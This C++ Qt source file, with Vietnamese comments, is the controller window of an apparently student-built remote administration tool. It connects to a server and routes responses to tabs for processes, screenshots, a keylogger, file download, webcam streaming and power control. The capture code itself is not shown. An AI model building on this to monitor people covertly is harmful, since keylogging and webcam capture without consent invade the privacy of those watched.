#include "MainWindow.h"
#include "ui_MainWindow.h"

#include <QPushButton>
#include <QMessageBox>
#include <QDebug>


MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    //-----------------------------------
    // Tạo ClientSocket
    //-----------------------------------

    clientSocket = new ClientSocket(this);


    //-----------------------------------
    // Tạo các Pages
    //-----------------------------------

    applicationPage = new ApplicationPage(this);
    processPage = new ProcessPage(this);
    screenshotPage = new ScreenshotPage(this);
    keyloggerPage = new KeyloggerPage(this);
    filePage = new FilePage(this);
    webcamPage = new WebcamPage(this);
    powerPage = new PowerPage(this);


    //-----------------------------------
    // Truyền ClientSocket cho các Pages
    //-----------------------------------

    applicationPage->setClientSocket(clientSocket);
    processPage->setClientSocket(clientSocket);
    screenshotPage->setClientSocket(clientSocket);
    keyloggerPage->setClientSocket(clientSocket);
    filePage->setClientSocket(clientSocket);
    webcamPage->setClientSocket(clientSocket);
    powerPage->setClientSocket(clientSocket);


    //-----------------------------------
    // Thêm Pages vào TabWidget
    //-----------------------------------

    ui->tabWidget->addTab(applicationPage,
                          "📱 Application");

    ui->tabWidget->addTab(processPage,
                          "⚙ Processes");

    ui->tabWidget->addTab(screenshotPage,
                          "📸 Screenshot");

    ui->tabWidget->addTab(keyloggerPage,
                          "⌨ Keylogger");

    ui->tabWidget->addTab(filePage,
                          "📁 File Explorer");

    ui->tabWidget->addTab(webcamPage,
                          "📹 Webcam");

    ui->tabWidget->addTab(powerPage,
                          "⏻ Power");


    //-----------------------------------
    // Kết nối Button Signals
    //-----------------------------------

    connect(ui->btnConnect,
            &QPushButton::clicked,
            this,
            &MainWindow::onConnectClicked);

    connect(ui->btnDisconnect,
            &QPushButton::clicked,
            this,
            &MainWindow::onDisconnectClicked);


    //-----------------------------------
    // Kết nối ClientSocket Signals
    //-----------------------------------

    connect(clientSocket,
            &ClientSocket::packetReceived,
            this,
            &MainWindow::onPacketReceived);

    connect(clientSocket,
            &ClientSocket::connected,
            this,
            &MainWindow::onConnected);

    connect(clientSocket,
            &ClientSocket::disconnected,
            this,
            &MainWindow::onDisconnected);

    connect(clientSocket,
            &ClientSocket::errorOccurred,
            this,
            &MainWindow::onError);


    //-----------------------------------
    // Disable tabs khi chưa kết nối
    //-----------------------------------

    ui->tabWidget->setEnabled(false);
    ui->btnDisconnect->setEnabled(false);
}


MainWindow::~MainWindow()
{
    delete ui;
}


//---------------------------------------------------
// Xử lý nút Connect
//---------------------------------------------------

void MainWindow::onConnectClicked()
{
    QString ip = ui->inputIP->text().trimmed();

    if (ip.isEmpty())
    {
        QMessageBox::warning(this, "Warning",
                             "Please enter the server IP address!");
        return;
    }

    ui->labelStatus->setText("🟡 Connecting...");
    ui->labelStatus->setStyleSheet("color: #f39c12; font-weight: bold; padding: 5px;");

    ui->btnConnect->setEnabled(false);

    int port = Constants::SERVER_PORT;
    if (ip.contains(":"))
    {
        QStringList parts = ip.split(":");
        ip = parts[0];
        port = parts[1].toInt();
    }

    if (clientSocket->connectToServer(ip, port))
    {
        // onConnected() sẽ được gọi qua signal
    }
    else
    {
        ui->labelStatus->setText("⚫ Connection failed");
        ui->labelStatus->setStyleSheet("color: #e74c3c; font-weight: bold; padding: 5px;");
        ui->btnConnect->setEnabled(true);

        QMessageBox::critical(this, "Connection Failed",
            "Cannot connect to server at: " + ip);
    }
}


//---------------------------------------------------
// Xử lý nút Disconnect
//---------------------------------------------------

void MainWindow::onDisconnectClicked()
{
    clientSocket->disconnectFromServer();
}


//---------------------------------------------------
// Khi kết nối thành công
//---------------------------------------------------

void MainWindow::onConnected()
{
    ui->labelStatus->setText("🟢 Connected");
    ui->labelStatus->setStyleSheet("color: #27ae60; font-weight: bold; padding: 5px;");

    ui->tabWidget->setEnabled(true);
    ui->btnConnect->setEnabled(false);
    ui->btnDisconnect->setEnabled(true);
    ui->inputIP->setEnabled(false);

    statusBar()->showMessage("Connected to server successfully!", 3000);
}


//---------------------------------------------------
// Khi ngắt kết nối
//---------------------------------------------------

void MainWindow::onDisconnected()
{
    ui->labelStatus->setText("⚫ Disconnected");
    ui->labelStatus->setStyleSheet("color: #e74c3c; font-weight: bold; padding: 5px;");

    ui->tabWidget->setEnabled(false);
    ui->btnConnect->setEnabled(true);
    ui->btnDisconnect->setEnabled(false);
    ui->inputIP->setEnabled(true);

    statusBar()->showMessage("Disconnected from server.", 3000);
}


//---------------------------------------------------
// Khi có lỗi
//---------------------------------------------------

void MainWindow::onError(const QString& errorMessage)
{
    statusBar()->showMessage("Error: " + errorMessage, 5000);
}


//---------------------------------------------------
// Route packet từ Server đến đúng Page
//---------------------------------------------------

void MainWindow::onPacketReceived(const Packet& packet)
{
    QString command = packet.getCommand();

    //=========================================
    // Application commands
    //=========================================
    if (command == Protocol::LIST_APPLICATION ||
        command == Protocol::OPEN_APPLICATION ||
        command == Protocol::CLOSE_APPLICATION)
    {
        applicationPage->handleResponse(packet);
    }

    //=========================================
    // Process commands
    //=========================================
    else if (command == Protocol::LIST_PROCESS ||
             command == Protocol::KILL_PROCESS ||
             command == Protocol::START_PROCESS)
    {
        processPage->handleResponse(packet);
    }

    //=========================================
    // Screenshot commands
    //=========================================
    else if (command == Protocol::SCREENSHOT ||
             command == Protocol::START_LIVE_SCREEN ||
             command == Protocol::STOP_LIVE_SCREEN)
    {
        screenshotPage->handleResponse(packet);
    }

    //=========================================
    // Keylogger commands
    //=========================================
    else if (command == Protocol::START_KEYLOGGER ||
             command == Protocol::STOP_KEYLOGGER ||
             command == Protocol::GET_KEYLOGGER_DATA)
    {
        keyloggerPage->handleResponse(packet);
    }

    //=========================================
    // File commands
    //=========================================
    else if (command == Protocol::LIST_FILES ||
             command == Protocol::DOWNLOAD_FILE)
    {
        filePage->handleResponse(packet);
    }

    //=========================================
    // Webcam commands
    //=========================================
    else if (command == Protocol::CAPTURE_WEBCAM ||
             command == Protocol::START_WEBCAM_STREAM ||
             command == Protocol::STOP_WEBCAM_STREAM)
    {
        webcamPage->handleResponse(packet);
    }

    //=========================================
    // Power commands
    //=========================================
    else if (command == Protocol::SHUTDOWN ||
             command == Protocol::RESTART ||
             command == Protocol::SLEEP ||
             command == Protocol::LOG_OFF)
    {
        powerPage->handleResponse(packet);
    }

    //=========================================
    // Error
    //=========================================
    else if (command == Protocol::ERROR)
    {
        statusBar()->showMessage("Server error: " + packet.getData(), 5000);
    }
}
